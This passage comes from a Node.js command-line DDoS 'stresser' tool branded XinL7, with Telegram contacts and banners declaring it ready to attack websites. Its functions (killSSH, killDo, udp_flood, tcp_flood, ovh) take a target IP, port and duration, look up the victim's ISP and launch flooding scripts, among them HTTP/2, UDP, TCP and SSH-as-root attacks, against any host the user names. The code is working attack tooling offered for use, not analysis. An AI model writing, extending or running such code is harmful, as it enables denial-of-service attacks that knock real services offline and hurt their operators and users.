⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mH2-CFB\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const raw = path.join(__dirname, `/lib/cache/h2cfb.js`);
const dira = path.join(__dirname, `/lib/cache/turbo.js`);
const lala = path.join(__dirname, `/lib/cache/browserfast.mjs`);
        exec(`node ${raw} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${dira} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${lala} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
//========//
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: Kill-Ssh <Target> <Duration>
Kill-Ssh 123.456.789.10 60 Flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑰𝑺𝑷      : ${result.isp}
𝑰𝑷       : ${result.query}
𝑨𝑺𝑵       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <Target> <Duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑫𝒊𝒈𝒊𝒕𝒂𝒍 𝑶𝒄𝒆𝒂𝒏 𝑲𝒊𝒍𝒍𝒆𝒓
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}
const raw = path.join(__dirname, `/lib/cache/raw.js`);
const flood = path.join(__dirname, `/lib/cache/h2flood.js`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: Udp <Target> <Port> <Duration>
Udp 123.456.78.910 53 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑼𝑫𝑷 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/udp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function tcp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: Tcp <Target> <Port> <Duration>
Tcp 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑪𝑷 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function ovh(args) {
  if (args.length < 3) {
    console.log(`Example: Ovh <Target> <Port> <Duration>
Ovh 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
